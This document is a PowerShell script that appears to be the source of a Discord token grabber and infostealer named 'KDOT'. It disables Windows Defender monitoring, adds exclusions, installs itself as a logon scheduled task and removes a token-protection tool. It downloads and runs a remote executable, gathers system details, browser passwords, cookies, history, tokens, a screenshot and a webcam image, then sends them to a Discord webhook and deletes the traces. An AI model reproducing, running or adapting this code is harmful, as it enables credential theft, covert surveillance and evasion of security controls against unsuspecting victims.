function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function TASKS {
    Set-MpPreference -DisableRealtimeMonitoring $true
    $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
    if ($test_KDOT -eq $false) {
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
        Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
        New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\KDOT"
        $origin = $MyInvocation.MyCommand.Path
        Copy-Item -Path "$origin" -Destination "$env:APPDATA\KDOT\KDOT.ps1"
    }
    $test = Get-ScheduledTask | Select-Object -ExpandProperty TaskName
    if ($test -contains "KDOT") {
        Write-Host "KDOT already exists"
    } else {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:APPDATA\KDOT\KDOT.ps1"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
        Register-ScheduledTask -TaskName "KDOT" -Action $Action -Trigger $Trigger -Settings $Settings
    }
    Grub
}

function Grub {
    $webhook = "YOUR_WEBHOOK_HERE"
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $system_info = systeminfo.exe > $env:LOCALAPPDATA\Temp\system_info.txt
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty MACAddress > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt

    $payload = @{
        "username" = "KING KDOT"
        "avatar_url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png"
        "content" = "@everyone``````ip: $ip username: $username hostname: $hostname uuid: $uuid``````"
    }

    $payload = $payload | ConvertTo-Json
    Invoke-WebRequest -Uri $webhook -Method Post -Body $payload -ContentType "application/json" | Out-Null
    taskkill.exe /f /im "Discord.exe"
    taskkill.exe /f /im "DiscordCanary.exe"
    taskkill.exe /f /im "DiscordPTB.exe"
    taskkill.exe /f /im "DiscordTokenProtector.exe"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    Set-Location $env:LOCALAPPDATA\Temp
    Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe"
    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }
    $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure"

    $lol = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\system_info.txt" -Destination "$lol\KDOT\system_info.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\uuid.txt" -Destination "$lol\KDOT\uuid.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\mac.txt" -Destination "$lol\KDOT\mac.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-cookies.txt" -Destination "$lol\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-history.txt" -Destination "$lol\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-passwords.txt" -Destination "$lol\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\webcam.jpg" -Destination "$lol\KDOT\webcam.jpg" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue
    Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force
    #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data"
    #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook
    curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"FILES BELOW\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
    Remove-Item "$lol\KDOT.zip" -Force
    Remove-Item "$lol\KDOT" -Recurse -Force
    Remove-Item "$lol\main.exe" -Force

}

if (CHECK_IF_ADMIN -eq $true) {
    TASKS
    #pause
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 5
    EXIT
}
